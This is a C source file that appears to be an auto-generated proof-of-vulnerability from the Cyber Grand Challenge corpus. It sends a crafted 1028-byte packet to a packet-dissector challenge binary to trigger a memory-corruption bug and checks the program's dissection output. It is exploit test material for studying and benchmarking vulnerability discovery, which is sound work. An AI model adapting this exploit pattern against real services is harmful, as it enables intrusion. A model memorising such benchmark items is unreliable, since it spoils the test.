#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xa5\x82\x25\x8e"
         "\x1f\x3b\x2a\x64\x17\xf8\x63\xce\x59\x02\x50\xde\xf2\x23\x00\xc2"
         "\xdf\x00\x00\x00\xf3\x29\xf8\xbc\x05\xe5\xa0\x0b\x71\x02\x26\xd1"
         "\x78\xe8\x33\x91\x78\x1b\x78\x6d\x79\xf7\xcd\x20\xe1\x62\x71\x33"
         "\xa2\xba\x08\x6f\x5a\xb4\x83\x27\xe2\x1f\x95\x9f\x1d\xf8\x0b\x67"
         "\x7d\xfc\xe4\xf5\xb4\x1d\x59\x2d\xb0\xb9\x14\x34\x5b\x1d\x44\x07"
         "\xc3\x7b\xa8\x18\x98\x51\xa4\x60\x89\xee\x5d\x81\xe5\xfe\x1a\x84"
         "\x93\x18\x18\x46\x8c\x7f\xd8\x89\xea\x2c\xbc\x09\xa0\xe3\xae\x4c"
         "\x77\xc2\xce\x94\x11\xa9\x2a\x48\xc2\xe9\xcc\x74\xdf\x80\xdc\xf3"
         "\x53\x04\x0e\x63\x79\x16\x90\x83\x03\x73\xaf\x08\xa6\x50\x52\x5c"
         "\xdc\xa7\x77\xfa\x73\x0c\x8a\xe3\x08\x44\x8b\xb1\x6e\xfa\x4e\x0a"
         "\xef\xf7\x2e\xd3\x9d\xc4\xa3\x55\x8e\x94\x7b\x19\x6d\x93\x71\xc8"
         "\x1f\xe6\x75\x16\x99\xfb\xfc\xa9\x1a\xba\x33\x8b\xc9\xe9\x69\x4c"
         "\xeb\xb3\x8a\xd8\x07\xe7\x29\xcd\x2e\xcb\x59\x6a\x79\x25\xc1\x61"
         "\x2c\x23\xb4\x17\x1a\x0d\xf8\x7f\x8d\xec\x17\x3a\xf6\x58\xb4\x61"
         "\x35\x4c\x0e\xe8\x00\x59\x5a\x36\x5c\x71\xfd\xb0\x25\xe0\x50\x73"
         "\x08\x6e\xfa\xba\x36\x85\x2f\xb3\x7e\x07\x5a\xbc\xbf\xda\x23\xa6"
         "\xed\xd5\x9a\x65\x73\x8b\x7f\xe7\xd2\x42\x68\x13\x7a\x87\x55\x1c"
         "\x14\x6a\xac\x0b\x25\x04\x25\xe9\xac\xf4\x76\x2a\x4e\xc9\xb3\x56"
         "\x17\xee\xe0\xce\x8c\x45\x39\xcd\x7b\x75\x38\xd9\xd4\xd8\xbe\xe0"
         "\x31\x7f\x64\xcb\xd0\x72\x77\x4d\x16\xb1\xee\x92\xd0\x1f\x89\x5b"
         "\xe8\x10\x93\x5b\xf9\xe6\x5a\x5e\x7b\x48\xb4\x30\x99\x66\xc1\x80"
         "\x75\x71\x01\x17\xb7\x10\x66\xfe\x27\x41\x96\xea\x3d\x57\x39\x1b"
         "\xd7\x70\xe4\xc0\xd2\x67\x87\x4d\x0b\x97\x7c\x6b\xe6\x26\x4d\xd7"
         "\x6e\xcc\x89\x38\x91\x71\xc7\xbc\x20\x52\xb3\x85\x18\xb9\xa4\x9e"
         "\x5b\x9f\xe7\xaf\x05\xdd\x1e\xe8\x36\x39\xba\xd0\xfb\x07\xda\xe1"
         "\x34\x66\x6a\x5c\x92\x64\xe0\x77\xb2\xfd\x8d\x3c\x5a\xcb\x68\xab"
         "\xc8\x7e\x03\x0f\xa2\xf7\x65\xe7\xcb\x7c\x11\x7e\x32\xec\x0c\xac"
         "\x57\x64\xd6\x0d\xe2\xe8\xad\xbc\x32\xc8\x70\x9c\x4b\x3c\xa2\x59"
         "\x83\xe6\x66\x1b\xca\xdd\xa3\x92\x41\xe8\xf6\xdf\x20\x18\x1a\xf9"
         "\x17\xcd\xab\x19\x7b\x80\x3c\xdb\x0d\x15\x85\xc2\x3f\x64\x49\x44"
         "\x1d\x7b\xdf\x12\xf3\x4a\x7f\xc3\xed\x29\x39\xac\x82\x79\x63\x6d"
         "\x2f\x29\x14\xd0\x50\x94\x44\xde\x37\x1e\x51\xca\x14\x6f\x7b\xca"
         "\xb3\x33\x00\xe0\x5c\xfa\x53\x4f\x50\xe2\xbe\x18\x69\x81\x42\xf4"
         "\x7d\x5a\x67\xf0\x7e\x3e\x9b\x58\x99\xd9\x7b\x33\x33\x33\x00\x22"
         "\xc7\x05\x1b\x20\x78\x3a\x07\x24\xfd\x33\x83\x72\xb5\xf1\x8d\x6e"
         "\x7a\xb3\x65\x9f\xca\x6c\xf6\x42\xdc\x43\xee\x51\xca\x00\x7a\xfe"
         "\x0a\x20\x59\x19\x9f\x24\x9f\x27\xba\xf3\x8b\x6f\x98\x45\xbb\x5a"
         "\x63\xe3\x43\x9c\x6d\xec\x62\x5b\x40\xf0\xc0\xb0\x79\x07\x6d\x87"
         "\x68\x2e\xb4\x9a\x4e\xa6\x0d\xfa\x9f\x16\xae\x35\x66\x00\x0e\xeb"
         "\xbe\x0a\x3d\x07\x86\x1e\xf0\xdd\x2a\x75\xed\x6d\x04\x00\xfc\xaf"
         "\xe7\x02\xf3\x7b\x3a\x56\x13\x8a\x37\xe3\x98\x87\x96\x7b\xba\x9f"
         "\x8d\x90\xbd\x5f\xa5\xde\x2b\x1b\x76\xff\x78\x53\x64\xd6\xd2\xd1"
         "\x63\x42\xf2\x80\xe4\x42\xe0\x91\xf4\x6d\x09\xea\xf5\x7c\xc3\x36"
         "\x45\xa1\x2f\x6a\x6e\x54\x0b\x2a\x6f\x58\x6a\x1e\xde\x58\x70\xc7"
         "\xf3\xa8\x53\xb8\x54\x66\xd1\x3c\x42\x90\x1f\xc0\x59\xcb\x3d\x05"
         "\x7b\x22\x02\xd4\xb3\x2b\xf8\x97\x85\xd0\x04\x0e\x24\x60\x85\x4d"
         "\x07\x0f\x56\xd3\x70\x4f\xe6\x19\xf8\xdc\x39\x74\x44\x33\xee\x2b"
         "\xbf\xdc\x19\x3c\xf8\x82\x1b\x8d\x25\xf7\x53\xa0\x7f\xd3\x5f\x23"
         "\xdf\xfe\xd5\x0c\xb3\x9d\xac\x0b\x53\x45\x79\x83\x49\x5e\xe6\x74"
         "\x41\x8f\x6a\x9c\xc1\x1c\xc9\xcd\x11\x25\x9d\x97\xc9\x40\xdd\xe3"
         "\x55\xdd\xad\x1f\x3d\x56\xa1\x20\x87\x5b\x46\x54\x96\x76\xfa\x74"
         "\x7a\x6d\xd8\xaf\x5d\xfd\x58\xea\xea\x6a\xb2\x85\xda\x57\x33\x33"
         "\x00\xd3\x04\xbb\x20\x20\x76\x39\xfa\xef\x56\x88\x82\x66\x15\x8a"
         "\xf6\xc8\x42\xd8\x58\x33\x3a\x4e\xbe\xb8\x0f\x0f\xef\x9a\x90\x55"
         "\x83\x88\x06\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===uxoriouslyelectrotechnic
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x75\x78\x6f\x72\x69\x6f\x75\x73\x6c\x79\x65"
         "\x6c\x65\x63\x74\x72\x6f\x74\x65\x63\x68\x6e\x69\x63";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
